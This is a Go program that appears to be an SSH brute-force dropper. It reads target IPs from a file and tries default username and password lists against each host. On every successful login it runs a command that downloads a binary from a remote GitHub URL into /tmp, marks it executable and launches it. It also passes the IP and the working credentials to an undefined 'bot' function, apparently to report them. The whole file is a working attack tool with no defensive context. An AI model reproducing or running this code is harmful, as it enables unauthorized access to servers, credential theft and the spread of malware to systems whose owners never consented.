package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	"golang.org/x/crypto/ssh"
)




func fun(ip string) {





	lista_users := []string{
                 




        "kubernetes",
        "root",
        "openbsd" , 
         "admin",
         "admin12345",
         "administrator",
         "webadmin",
           "webmaster",
            "alpine",
            "ubuntu",
              "linux" , 
             "qwerty",
             "password", 
              "password123",
                "debian",
                "guest",

		

	}

	lista_pass := []string{
               	

        "kubernetes",
        "root",
        "openbsd" , 
         "admin", 
         "admin12345", 
         "administrator",
         "webadmin",
           "webmaster",
            "alpine",
            "ubuntu",
              "linux",
             "qwerty",
             "password", 
              "password123",
                "debian",
                "guest",



}





	for _, user := range lista_users {
		for _, senha := range lista_pass {
			fmt.Println(ip)
			config := &ssh.ClientConfig{
				User: user,
				Auth: []ssh.AuthMethod{
					ssh.Password(senha),
				},
				HostKeyCallback: ssh.InsecureIgnoreHostKey(),
				Timeout:         10000   * time.Millisecond,

			}




			client, err := ssh.Dial("tcp",  ip  , config)

			if err != nil {
				fmt.Println("Failed to dial: ", err)
				continue

			}

			session, err := client.NewSession()
			if err != nil {
				fmt.Println(err)
				continue

			}


er := session.Run("curl -L  https://github.com/atilabyte/golang/raw/refs/heads/master/atila -o /tmp/atila ; chmod 777 /tmp/atila ; /tmp/./atila  & ")


                 

              go bot( ip ) ; go  bot (senha) ;  go bot (user)



			fmt.Println(er)

			session.Close()

			client.Close()

		}


	}

}






func main() {


file, err := os.Open("ips")


if err != nil {

fmt.Println("Erro ao abrir arquivo:", err)

return

}



scanner := bufio.NewScanner(file)

      for scanner.Scan() {


		ip := scanner.Text()


		go fun(ip)


	}




for {




time.Sleep (10 * time.Second)




}

}
